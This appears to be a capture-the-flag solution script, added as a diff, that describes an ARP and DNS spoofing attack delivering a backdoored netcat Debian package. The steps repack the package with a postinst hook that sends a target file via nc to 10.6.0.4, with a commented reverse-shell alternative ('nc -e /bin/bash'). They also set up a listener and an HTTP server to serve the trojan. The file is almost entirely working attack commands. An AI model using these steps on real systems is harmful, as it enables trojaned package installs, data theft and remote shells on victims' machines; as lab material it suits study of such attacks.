@@ -1,0 +1,55 @@
+# first terminal
+
+# nano arpjy.py  paste in code
+# nano dnsjy.py  paste in code
+
+# start netcat listener
+# if we want shell
+# nc -lv -p 41552
+
+# if we just want the file we need 
+nc -lv -p 41552 > NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+
+#switch terminals
+
+# build the file
+mkdir packing
+cp debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb packing/
+cd packing
+dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work
+mkdir work/DEBIAN
+ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb
+tar xvf control.tar.xz
+mv control work/DEBIAN/
+mv postinst work/DEBIAN/
+
+#  this gives a reverse shell
+#echo 'nc -e /bin/bash 10.6.0.4 41552 2>/dev/null &' >> work/DEBIAN/postinst
+
+#  this just gives us the file we need
+echo 'cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt | nc  10.6.0.4 41552 2>/dev/null &' >> work/DEBIAN/postinst
+
+dpkg-deb --build /home/guest/packing/work/
+mv work.deb suriv_amd64.deb
+cd ~
+mkdir pub
+mkdir pub/jfrost
+mkdir pub/jfrost/backdoor
+mv packing/suriv_amd64.deb pub/jfrost/backdoor/
+
+# start the server
+python3 -m http.server 80
+
+#switch terminals
+
+# start and background dnsjy.py, then start arpjy.py
+python3 dnsjy &
+python3 arpjy
+
+#the file we want
+# if we got shell
+#cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+
+# if we only transferred the file
+# stop the nc listener
+cat NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
